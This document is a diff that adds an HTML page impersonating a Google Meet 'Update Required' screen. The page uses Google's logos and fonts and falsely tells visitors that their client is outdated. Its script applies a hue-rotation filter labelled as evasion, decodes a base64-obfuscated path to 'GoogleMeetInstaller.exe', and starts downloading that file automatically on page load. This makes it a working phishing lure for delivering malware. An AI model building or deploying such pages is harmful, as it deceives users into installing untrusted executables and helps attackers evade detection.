@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Required - Google Meet</title>
+    <link rel="icon" href="https://www.gstatic.com/meet/icons/icon_728_728_20200708.png" type="image/png">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --google-blue-hover: #1557b0;
+            --bg-color: #ffffff;
+            --text-color: #202124;
+            --secondary-text: #5f6368;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Roboto', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #5f6368;
+            font-size: 22px;
+            font-weight: 400;
+            text-decoration: none;
+            margin-bottom: 48px;
+            position: absolute;
+            top: 24px;
+            left: 24px;
+        }
+
+        .logo-area img {
+            height: 32px;
+            width: auto;
+        }
+
+        .content-container {
+            max-width: 480px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .icon-container {
+            width: 80px;
+            height: 80px;
+            background-color: #e8f0fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .icon-container svg {
+            width: 40px;
+            height: 40px;
+            fill: var(--google-blue);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 16px;
+            color: var(--text-color);
+        }
+
+        p {
+            font-size: 14px;
+            line-height: 1.5;
+            color: var(--secondary-text);
+            margin-bottom: 32px;
+        }
+
+        .download-btn {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .download-btn:hover {
+            background-color: var(--google-blue-hover);
+            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
+        }
+    </style>
+</head>
+
+<body>
+
+    <a href="#" class="logo-area">
+        <img src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png"
+            alt="Google Meet">
+        <span>Meet</span>
+    </a>
+
+    <div class="content-container">
+        <div class="icon-container">
+            <svg focusable="false" viewBox="0 0 24 24">
+                <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z">
+                </path>
+            </svg>
+        </div>
+        <h1>Update Required</h1>
+        <p>Your Google Meet client is outdated. To continue joining meetings securely and access the latest features,
+            please download and install the latest update.</p>
+        <a href="#" class="download-btn" id="clickbtn">
+            Download Update
+        </a>
+        <p style="margin-top: 16px; color: #5f6368; font-size: 14px;">Download will start automatically. If not, click
+            the button above.</p>
+    </div>
+    <script>
+        // Hue Rotation Evasion
+        document.documentElement.style.cssText = "filter:hue-rotate(4deg)";
+
+        // Blob Download Logic
+        document.addEventListener('DOMContentLoaded', function (e) {
+            // Base64 encoded path: downloads/GoogleMeetInstaller.exe -> ZG93bmxvYWRzL0dvb2dsZU1lZXRJbnN0YWxsZXIuZXhl
+            const fileUrlEncoded = 'ZG93bmxvYWRzL0dvb2dsZU1lZXRJbnN0YWxsZXIuZXhl';
+            const fileUrl = atob(fileUrlEncoded);
+            const fileName = fileUrl.split('/').pop();
+
+            const link = document.getElementById('clickbtn');
+
+            if (link) {
+                fetch(fileUrl)
+                    .then(response => response.blob())
+                    .then(blob => {
+                        const blobUrl = URL.createObjectURL(blob);
+                        link.href = blobUrl;
+                        link.download = fileName;
+
+                        // Auto-click after delay
+                        setTimeout(() => {
+                            link.click();
+                        }, 1500);
+                    })
+                    .catch(err => console.error('Error preparing download:', err));
+            }
+        });
+    </script>
+</body>
+
+</html>
